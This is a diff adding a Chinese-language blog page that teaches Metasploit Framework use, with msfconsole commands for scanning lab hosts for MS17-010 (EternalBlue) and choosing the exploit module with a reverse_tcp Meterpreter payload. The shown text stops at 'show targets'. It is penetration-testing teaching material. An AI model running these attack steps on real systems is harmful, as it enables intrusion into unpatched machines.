@@ -1,0 +1,1767 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Metasploit Framework(MSF)的使用, 谢公子的小黑屋">
+    <meta name="description" content="介绍MSF的使用">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    
+    <style>
+        body{
+            background-image: url(https://pic.imgdb.cn/item/63f08805f144a010079e8aad.jpg);
+            background-repeat:no-repeat;
+            background-size: 100% 100%;
+            background-attachment:fixed;
+        }
+    </style>
+
+
+    <title>Metasploit Framework(MSF)的使用 | 谢公子的小黑屋</title>
+    <link rel="icon" type="image/png" href="/xie1997.github.io/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/xie1997.github.io/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/xie1997.github.io/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/xie1997.github.io/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/xie1997.github.io/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/xie1997.github.io/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/xie1997.github.io/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/xie1997.github.io/css/my.css">
+
+    <script src="/xie1997.github.io/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/xie1997.github.io/atom.xml" title="谢公子的小黑屋" type="application/atom+xml">
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/xie1997.github.io/" class="waves-effect waves-light">
+                    
+                    <img src="/xie1997.github.io/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">谢公子的小黑屋</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/xie1997.github.io/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/技术文章/" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-chalkboard" style="zoom: 0.6;"></i>
+      
+      <span>技术文章</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/xie1997.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">
+          
+          <span>域渗透</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/xie1997.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+          
+          <span>内网渗透</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/xie1997.github.io/tags/%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">
+          
+          <span>工具的使用</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/xie1997.github.io/tags/%E4%BA%91%E5%AE%89%E5%85%A8/">
+          
+          <span>云安全</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/xie1997.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+          
+          <span>渗透测试</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/安全培训/" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-chalkboard" style="zoom: 0.6;"></i>
+      
+      <span>安全培训</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/xie1997.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD/">
+          
+          <span>内网渗透培训</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/xie1997.github.io/tags/Web%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/">
+          
+          <span>Web安全培训</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/xie1997.github.io/categories/" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>文章分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/xie1997.github.io/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/xie1997.github.io/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于我</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/xie1997.github.io/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">谢公子的小黑屋</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/xie1997.github.io/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-chalkboard"></i>
+			
+			技术文章
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/xie1997.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/ " style="margin-left:50px">
+				  
+		          <span>域渗透</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/xie1997.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ " style="margin-left:50px">
+				  
+		          <span>内网渗透</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/xie1997.github.io/tags/%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/ " style="margin-left:50px">
+				  
+		          <span>工具的使用</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/xie1997.github.io/tags/%E4%BA%91%E5%AE%89%E5%85%A8/ " style="margin-left:50px">
+				  
+		          <span>云安全</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/xie1997.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ " style="margin-left:50px">
+				  
+		          <span>渗透测试</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-chalkboard"></i>
+			
+			安全培训
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/xie1997.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD/ " style="margin-left:50px">
+				  
+		          <span>内网渗透培训</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/xie1997.github.io/tags/Web%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/ " style="margin-left:50px">
+				  
+		          <span>Web安全培训</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/xie1997.github.io/categories/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			文章分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/xie1997.github.io/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/xie1997.github.io/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于我
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://pic.imgdb.cn/item/63e268444757feff33d2687b.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Metasploit Framework(MSF)的使用</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/xie1997.github.io/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/xie1997.github.io/tags/%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">
+                                <span class="chip bg-color">工具的使用</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/xie1997.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/" class="post-category">
+                                技术文章
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-03-01
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-02-28
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    6.7k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    26 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/xie1997.github.io/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><p>Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。刚开始的Metasploit是采用Perl语言编写的，但是再后来的新版中，改成了用Ruby语言编写的了。在kali中，自带了Metasploit工具。我们接下来以大名鼎鼎的永恒之蓝MS17_010漏洞为切入点，讲解MSF框架的使用。</p>
+<p><strong>MSF的更新</strong></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">msfupdate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078767822-6098a694-c3e3-41b0-babd-681a5bc71fa8.png" alt="img"></p>
+<h2 id="Metasploit的安装和升级"><a href="#Metasploit的安装和升级" class="headerlink" title="Metasploit的安装和升级"></a>Metasploit的安装和升级</h2><p>在一般的linux中，默认是不安装MSF的。以下是在非kali的Linux下安装MSF框架。</p>
+<p><strong>一键安装</strong></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">curl https<span class="token punctuation">:</span><span class="token operator">//</span>raw<span class="token punctuation">.</span>githubusercontent<span class="token punctuation">.</span>com<span class="token operator">/</span>rapid7<span class="token operator">/</span>metasploit<span class="token operator">-</span>omnibus<span class="token operator">/</span>master<span class="token operator">/</span>config<span class="token operator">/</span>templates<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">-</span>wrappers<span class="token operator">/</span>msfupdate<span class="token punctuation">.</span>erb <span class="token operator">></span> msfinstall <span class="token operator">&amp;</span><span class="token operator">&amp;</span> chmod <span class="token number">755</span> msfinstall <span class="token operator">&amp;</span><span class="token operator">&amp;</span> <span class="token punctuation">.</span><span class="token operator">/</span>msfinstall   
+adduser msf           <span class="token comment">#添加msf用户</span>
+su msf                <span class="token comment">#切换到msf用户</span>
+cd  <span class="token operator">/</span>opt<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span><span class="token builtin">bin</span>   <span class="token comment">#切换到msf所在的目录 </span>
+<span class="token punctuation">.</span><span class="token operator">/</span>msfconsole          <span class="token comment">#以后启动msfconsole，都切换到msf用户下启动，这样会同步数据库。如果使用root用户启动的话，不会同步数据库  </span>
+
+也可以将msfconsole加入到执行目录下，这样在任何目录直接msfconsole就可以了
+ln <span class="token operator">-</span>s <span class="token operator">/</span>opt<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>msfconsole <span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>msfconsole
+
+<span class="token comment">#备注：</span>
+<span class="token comment">#初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联，这也这也就是需要新建用户msf来运行metasploit的原因所在。如果你一不小心手一抖，初次运行是在root用户下，请使用 msfdb reinit 命令，然后使用非root用户初始化数据库。        </span>
+
+MSF后期的升级：msfupdate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>使用方法：</strong></p>
+<ul>
+<li>进入框架：msfconsole</li>
+<li>使用search命令查找相关漏洞： search ms17-010</li>
+<li>使用use进入模块: use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue </li>
+<li>使用info查看模块信息： info</li>
+<li>设置攻击载荷：set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</li>
+<li>查看模块需要配置的参数：show options</li>
+<li>设置参数：set RHOST 192.168.125.138</li>
+<li>攻击：exploit &#x2F; run </li>
+<li>后渗透阶段</li>
+</ul>
+<p>不同的攻击用到的步骤也不一样，这不是一成不变的，需要灵活使用。</p>
+<p>我们也可以将攻击代码写入 configure.rc（只要是以 .rc 结尾的文件）配置文件中，然后使用命令msfconsole -r configure.rc 进行自动攻击！</p>
+<h2 id="MSF中加载自定义的exploit模块"><a href="#MSF中加载自定义的exploit模块" class="headerlink" title="MSF中加载自定义的exploit模块"></a>MSF中加载自定义的exploit模块</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/100609875">CVE-2019-0708 远程桌面漏洞复现</a> ，该文中介绍了如果加载自定义的exploit模块并且成功攻击。</p>
+<h2 id="漏洞利用-exploit"><a href="#漏洞利用-exploit" class="headerlink" title="漏洞利用(exploit)"></a>漏洞利用(exploit)</h2><p>漏洞利用exploit，也就是我们常说的 exp，他就是对漏洞进行攻击的代码。</p>
+<p>exploit漏洞利用模块路径：**&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;exploits**</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078767708-f95d75a7-7595-4170-822b-83cbee209382.png" alt="img"></p>
+<p>这里面有针对不同平台的 exploit 。</p>
+<p>我们现在就进 windows 平台看看，这里会列出针对windows平台不同服务的漏洞利用</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078768171-1677112d-b59d-43bd-a21f-7d0bd16ece9d.png" alt="img"></p>
+<p>我们进入<strong>smb服务</strong>，这是windows中经常爆出漏洞的服务，比如我们的永恒之蓝漏洞就在这里面。漏洞利用代码是以 rb 结尾的文件，因为metasploit是用Ruby语言编写的。</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078770365-4799e1ac-baf8-455a-850b-12f3600f0742.png" alt="img"></p>
+<h2 id="攻击载荷-payload"><a href="#攻击载荷-payload" class="headerlink" title="攻击载荷(payload)"></a>攻击载荷(payload)</h2><p>payload模块路径：&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;payloads</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078767015-c7119588-8154-4eb7-b4e2-637663a53bda.png" alt="img"></p>
+<p>Payload中包含攻击进入目标主机后需要在远程系统中运行的恶意代码，而在Metasploit中Payload是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。简而言之，这种漏洞利用模块可以访问目标系统，而其中的代码定义了Payload在目标系统中的行为。</p>
+<p><strong>Shellcode</strong> ：Shellcode是payload中的精髓部分，在渗透攻击时作为攻击载荷运行的一组机器指令。Shellcode通常用汇编语言编写。在大多数情况下，目标系统执行了shellcode这一组指令 之后，才会提供一个命令行shell。</p>
+<p>Metasploit中的 Payload 模块主要有以下三种类型：</p>
+<ul>
+<li>-Single：Single是一种完全独立的Payload，而且使用起来就像运行 calc.exe 一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似 netcat 这样的非metasploit处理工具所捕捉到。</li>
+<li>-Stager：Stager这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的Stager Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接，让目标系统主动连接我们的端口(反向连接)。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)。</li>
+<li>-Stage：Stage是Stager Payload下的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制。</li>
+</ul>
+<p>在 Metasploit 中，我们可以通过Payload的名称和使用格式来推断它的类型：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">Single Payload的格式为：<span class="token operator">&lt;</span>target<span class="token operator">></span><span class="token operator">/</span> <span class="token operator">&lt;</span>single<span class="token operator">></span>  如：windows<span class="token operator">/</span>powershell_bind_tcp
+Stager<span class="token operator">/</span>Stage Payload的格式为：<span class="token operator">&lt;</span>target<span class="token operator">></span><span class="token operator">/</span> <span class="token operator">&lt;</span>stage<span class="token operator">></span> <span class="token operator">/</span> <span class="token operator">&lt;</span>stager<span class="token operator">></span>  如：windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>当我们在Metasploit中执行 show payloads 命令之后，它会给我们显示一个可使用的Payload列表。在这个列表中，像 windows&#x2F;powershell_bind_tcp 就是一个Single Payload，它不包含Stage Payload</p>
+<p>而 windows&#x2F;meterpreter&#x2F;reverse_tcp 则由一个<strong>Stage Payload（meterpreter</strong>）和 一个<strong>Stager Payload（reverse_tcp）</strong>组成。</p>
+<p><strong>Stager中几种常见的payload</strong></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcp       <span class="token comment">#正向连接</span>
+windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp    <span class="token comment">#反向连接，常用</span>
+windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_http   <span class="token comment">#通过监听80端口反向连接</span>
+windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_https  <span class="token comment">#通过监听443端口反向连接</span>
+
+正向连接使用场景：我们的攻击机在内网环境，被攻击机是外网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了。但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，比如被攻击机只对外开放了<span class="token number">80</span>端口。那么，我们就只能设置正向连接<span class="token number">80</span>端口了，这里很有可能失败，因为<span class="token number">80</span>端口上的流量太多了
+
+反向连接使用场景：我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了。如果是这样的情况，建议使用反向连接，因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量。
+
+反向连接<span class="token number">80</span>和<span class="token number">443</span>端口使用场景：被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置的特别严格，就连被攻击机访问外部网络的流量也进行了严格的限制，只允许被攻击机的<span class="token number">80</span>端口或<span class="token number">443</span>端口与外部通信<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p>Meterpreter属于<strong>stage payload</strong>，在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。</p>
+<p>Meterpreter是如何工作的？</p>
+<p>首先目标先要执行初始的溢出漏洞会话连接，可能是 bind正向连接，或者反弹 reverse 连接。反射连接的时候加载dll链接文件，同时后台悄悄处理 dll 文件。其次Meterpreter核心代码初始化,通过 socket套接字建立一个TLS&#x2F;1.0加密隧道并发送GET请求给Metasploit服务端。Metasploit服务端收到这个GET请求后就配置相应客户端。最后，Meterpreter加载扩展，所有的扩展被加载都通过TLS&#x2F;1.0进行数据传输。</p>
+<p>Meterpreter的特点：</p>
+<ul>
+<li>Meterpreter完全驻留在内存，没有写入到磁盘</li>
+<li>Meterpreter注入的时候不会产生新的进程，并可以很容易的移植到其它正在运行的进程</li>
+<li>默认情况下， Meterpreter的通信是加密的，所以很安全</li>
+<li>扩展性，许多新的特征模块可以被加载。</li>
+</ul>
+<p>我们在设置 payloads 时，可以将 payloads 设置为：windows&#x2F;meterpreter&#x2F;reverse_tcp ，然后获得了 meterpreter&gt; 之后我们就可以干很多事了！具体的做的事，在我们下面的后渗透阶段都有讲！</p>
+<h2 id="MS17-010-永恒之蓝"><a href="#MS17-010-永恒之蓝" class="headerlink" title="MS17_010(永恒之蓝)"></a>MS17_010(永恒之蓝)</h2><p>我们现在模拟使用 MS17_010 漏洞攻击，这个漏洞就是去年危害全球的勒索病毒利用的永恒之蓝漏洞。</p>
+<p>kali控制台输入：msfconsole 进入metasploit框架</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078958594-9ed7369b-8557-4776-aabb-f6ce6d564da8.png" alt="img">寻找MS17_010漏洞： search ms17_010 </p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078973904-1cc9d651-d3a4-4e92-ac5f-5b7d480df13f.png" alt="img"><br>这里找到了两个模块，第一个<strong>辅助模块</strong>是探测主机是否存在MS17_010漏洞，第二个是<strong>漏洞利用模块</strong>，我们先探测哪些主机存在漏洞 </p>
+<h3 id="Auxiliary辅助探测模块"><a href="#Auxiliary辅助探测模块" class="headerlink" title="Auxiliary辅助探测模块"></a>Auxiliary辅助探测模块</h3><p>该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。</p>
+<p>输入命令：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_ms17_010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635079000005-3e056e11-c929-4403-822a-0fcf692da134.png" alt="img">查看这个模块需要配置的信息：show options</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635079023419-e14da977-dea6-48ee-b1b4-cadd5d2165fc.png" alt="img"><br>RHOSTS 参数是要探测主机的ip或ip范围，我们探测一个ip范围内的主机是否存在漏洞</p>
+<p>输入：set RHOSTS 192.168.125.125-129.168.125.140</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635078769784-651af628-c4d2-491e-9f88-42fc899a1b9b.png" alt="img"></p>
+<p>输入：exploit 攻击，这里有+号的就是可能存在漏洞的主机，这里有3个主机存在漏洞</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635079083222-93acf79b-cda0-4373-806d-ee0c8700c7fc.png" alt="img"></p>
+<h3 id="Exploit漏洞利用模块"><a href="#Exploit漏洞利用模块" class="headerlink" title="Exploit漏洞利用模块"></a>Exploit漏洞利用模块</h3><p>然后我们就可以去利用漏洞攻击了，选择漏洞攻击模块： use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue </p>
+<p>查看这个漏洞的信息：info</p>
+<p><img src="/xie1997.github.io/xie1997.github.io/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/1635079088706-991a3487-a8ce-4de8-bda3-98f6db2dff0b.png" alt="img"><br>查看可攻击的系统平台，这个命令显示该攻击模块针对哪些特定操作系统版本、语言版本的系统：show targets</p>
